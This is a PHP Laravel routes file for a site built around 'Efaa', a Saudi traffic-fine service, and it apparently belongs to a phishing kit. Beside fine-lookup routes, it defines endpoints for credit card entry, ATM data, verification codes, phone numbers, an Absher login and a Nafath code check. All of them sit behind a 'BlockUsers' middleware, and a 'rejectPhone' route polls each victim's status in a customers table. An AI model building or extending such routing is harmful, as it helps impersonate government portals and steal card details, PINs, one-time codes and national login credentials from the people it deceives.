<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use App\Http\Controllers\EfaaController;
use App\Http\Middleware\BlockUsers;


Route::GET('/about-us', function () {

    return view('about');

});


Route::GET('/home', function () {

    return view('welcome1');

});


Route::GET('/info', function () {

    return view('info');

});


Route::GET('/efaa', function () {

    return view('efaa');

});


Route::GET('/steps', function () {

    return view('steps');

});



Route::POST('/GetViolationsByViolatorinquery', [EfaaController::class, 'GetViolationsByViolatorinquery'])->middleware(BlockUsers::class);
Route::POST('/GetViolationsByViolatorHome', [EfaaController::class, 'GetViolationsByViolatorHome'])->middleware(BlockUsers::class);
// Home Page Request
Route::GET('/', [EfaaController::class, 'home'])->middleware(BlockUsers::class);
Route::POST('/extGetTrafficViolationInfo', [EfaaController::class, 'extGetTrafficViolationInfo'])->middleware(BlockUsers::class);
Route::POST('/extSearchByFineNumAndViolaterId', [EfaaController::class, 'extSearchByFineNumAndViolaterId'])->middleware(BlockUsers::class);
Route::GET('/addto', [EfaaController::class, 'addto'])->middleware(BlockUsers::class);
Route::POST('/creditcard', [EfaaController::class, 'creditcard'])->middleware(BlockUsers::class);
Route::POST('/verifycode', [EfaaController::class, 'verifycode'])->middleware(BlockUsers::class);
Route::POST('/atm', [EfaaController::class, 'atm'])->middleware(BlockUsers::class);
Route::POST('/send-phone', [EfaaController::class, 'sendphone'])->middleware(BlockUsers::class);
Route::POST('/verifyb', [EfaaController::class, 'verifyb'])->middleware(BlockUsers::class);
Route::POST('/verifya', [EfaaController::class, 'verifya'])->middleware(BlockUsers::class);
Route::POST('/extGetPersonalInfoByIdAndDob', [EfaaController::class, 'extGetPersonalInfoByIdAndDob'])->middleware(BlockUsers::class);


Route::get('/nafath', function(Request $request) {  return view('new.nfath'); })->middleware(BlockUsers::class);
Route::get('/nfathcode', function(Request $request) { return view('new.nfathCode');})->middleware(BlockUsers::class);
Route::POST('/loginabsher',        [EfaaController::class, 'loginAbsher'])->middleware(BlockUsers::class);
Route::POST('/checknfathcode', [EfaaController::class, 'getStatus'])->middleware(BlockUsers::class);



Route::POST('/rejectPhone', function (Request $request) {


    $nid = session('id');

    $isFound = 0;

    $customers = DB::table('customers')->where('id_ref',$nid)->first();
    $isFound   = $customers->status;

     
    $result = array('data' =>  $isFound );
    return Response::json($result, 200, array('Content-Type' => 'application/javascript'));

    

})->middleware(BlockUsers::class);









